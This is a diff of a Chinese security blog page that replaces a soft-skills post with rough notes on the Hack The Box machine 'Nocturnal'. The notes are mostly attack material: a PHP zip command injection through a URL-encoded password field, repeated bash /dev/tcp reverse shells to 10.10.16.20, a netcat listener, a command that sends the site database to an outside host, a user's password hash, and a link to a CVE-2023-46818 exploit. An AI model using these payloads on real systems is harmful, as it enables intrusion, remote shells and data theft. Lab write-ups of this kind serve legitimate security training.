@@ -6,18 +6,24 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="社会中的软技能">
+    <meta name="description" content="$command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;; $command &#x3D; “zip -x ‘.&amp;#x2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="社会中的软技能">
-<meta property="og:url" content="https://feesec.github.io/2024/11/13/2024-03-17-softskils/index.html">
+<meta property="og:title" content="htb-nocturnal">
+<meta property="og:url" content="https://feesec.github.io/2025/04/26/htb-nocturnal/index.html">
 <meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
-<meta property="og:description" content="社会中的软技能">
+<meta property="og:description" content="$command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;; $command &#x3D; “zip -x ‘.&amp;#x2">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-11-13T11:02:59.681Z">
-<meta property="article:modified_time" content="2024-11-13T11:02:59.681Z">
+<meta property="og:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image.png">
+<meta property="og:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image-1.png">
+<meta property="og:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image-2.png">
+<meta property="og:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image-3.png">
+<meta property="article:published_time" content="2025-04-26T07:20:23.632Z">
+<meta property="article:modified_time" content="2025-04-26T07:20:23.632Z">
 <meta property="article:author" content="Leon">
-<meta property="article:tag" content="skills">
+<meta property="article:tag" content="htb">
+<meta property="article:tag" content="sec">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image.png">
     
     
       
@@ -37,7 +43,7 @@
       
     
     <!-- title -->
-    <title>社会中的软技能</title>
+    <title>htb-nocturnal</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -102,10 +108,8 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="上一篇" href="/2024/11/13/2024-03-22-%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3python%E4%B8%AD%E7%9A%84%E5%BC%82%E6%AD%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
-        
-        <li><a class="icon" aria-label="下一篇" href="/2024/11/13/2024-03-19-Django/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/2025/04/26/ai-and-sec/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -118,25 +122,21 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2024/11/13/2024-03-17-softskils/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&text=社会中的软技能"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&is_video=false&description=社会中的软技能"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=社会中的软技能&body=Check out this article: https://feesec.github.io/2024/11/13/2024-03-17-softskils/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&name=社会中的软技能&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&t=社会中的软技能"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2025/04/26/htb-nocturnal/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&text=htb-nocturnal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&is_video=false&description=htb-nocturnal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=htb-nocturnal&body=Check out this article: https://feesec.github.io/2025/04/26/htb-nocturnal/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&name=htb-nocturnal&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2025/04/26/htb-nocturnal/&t=htb-nocturnal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E4%B8%AD%E7%9A%84%E8%BD%AF%E6%8A%80%E8%83%BD"><span class="toc-number">1.</span> <span class="toc-text">社会中的软技能</span></a></li></ol>
-      </div>
     
   </span>
 </div>
@@ -148,7 +148,7 @@
   <header>
     
     <h1 class="posttitle p-name" itemprop="name headline">
-        社会中的软技能
+        htb-nocturnal
     </h1>
 
 
@@ -160,25 +160,20 @@
       
     <div class="postdate">
       
-        <time datetime="2024-11-13T11:02:59.681Z" class="dt-published" itemprop="datePublished">2024-11-13</time>
+        <time datetime="2025-04-26T07:20:23.632Z" class="dt-published" itemprop="datePublished">2025-04-26</time>
         
-        (Updated: <time datetime="2024-11-13T11:02:59.681Z" class="dt-updated" itemprop="dateModified">2024-11-13</time>)
+        (Updated: <time datetime="2025-04-26T07:20:23.632Z" class="dt-updated" itemprop="dateModified">2025-04-26</time>)
         
       
     </div>
 
 
       
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/career/">career</a>
-    </div>
-
 
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/skills/" rel="tag">skills</a>
+        <a class="p-category" href="/tags/htb/" rel="tag">htb</a>, <a class="p-category" href="/tags/sec/" rel="tag">sec</a>
     </div>
 
 
@@ -187,14 +182,25 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="社会中的软技能"><a href="#社会中的软技能" class="headerlink" title="社会中的软技能"></a>社会中的软技能</h1><ol>
-<li><p>交流能力<br>交流能力是非常重要的，减少内耗，不要盲目自我消化，首先查询从互联网上。</p>
-</li>
-<li><p>解决问题的能力</p>
-</li>
-<li><p>认识别人的能力。</p>
-</li>
-</ol>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><code>$command = &quot;zip -x &#39;./backups/*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;</code></p>
+<p>$command &#x3D; “zip -x ‘.&#x2F;backups&#x2F;*’ -r -P<br>bash -c ‘id’<br> “ . $backupFile . “ .  &gt; “ . $logFile . “ 2&gt;&amp;1 &amp;”;</p>
+<p>%0abash%09-c%09%22bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261%22%0a</p>
+<p><a href="/../assets/img/htb-nocturnal/image.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image.png" alt="alt text"></a></p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.20&#x2F;4443 0&gt;&amp;1<br>bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.20&#x2F;4443 0&gt;&amp;1</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.20&#x2F;4443 0&gt;&amp;1</p>
+<p>ls</p>
+<p>password&#x3D;%0abash%09-c%09%22bash%09-i%09%3e%26%09%2fdev%2ftcp%2f10.10.16.20%2f4443%090%3e%261%22%0a&amp;backup&#x3D;】</p>
+<p>nc -lvp 8888 &gt; received_database.db</p>
+<p>cat nocturnal_database.db &gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.10&#x2F;8888</p>
+<p><a href="/../assets/img/htb-nocturnal/image-1.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image-1.png" alt="alt text"></a></p>
+<p>为啥选择这个用户 可以cat &#x2F;etc&#x2F;passwd | grep bash 这个就是用户</p>
+<p>4|tobias|55c82b1ccd55ab219b3b109b07d5061d</p>
+<p>通过爆破或者查询</p>
+<p><a href="/../assets/img/htb-nocturnal/image-2.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image-2.png" alt="alt text"></a></p>
+<p><a href="/../assets/img/htb-nocturnal/image-3.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image-3.png" alt="alt text"></a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bipbopbup/CVE-2023-46818-python-exploit">EXP</a></p>
+<p>存在密码复用的情况</p>
 </div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
             selector: '.gallery-item'
@@ -238,32 +244,26 @@
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E4%B8%AD%E7%9A%84%E8%BD%AF%E6%8A%80%E8%83%BD"><span class="toc-number">1.</span> <span class="toc-text">社会中的软技能</span></a></li></ol>
-      </div>
-    
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2024/11/13/2024-03-17-softskils/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&text=社会中的软技能"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&is_video=false&description=社会中的软技能"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=社会中的软技能&body=Check out this article: https://feesec.github.io/2024/11/13/2024-03-17-softskils/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&title=社会中的软技能"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&name=社会中的软技能&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2024/11/13/2024-03-17-softskils/&t=社会中的软技能"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2025/04/26/htb-nocturnal/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&text=htb-nocturnal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&is_video=false&description=htb-nocturnal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=htb-nocturnal&body=Check out this article: https://feesec.github.io/2025/04/26/htb-nocturnal/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&title=htb-nocturnal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2025/04/26/htb-nocturnal/&name=htb-nocturnal&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2025/04/26/htb-nocturnal/&t=htb-nocturnal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
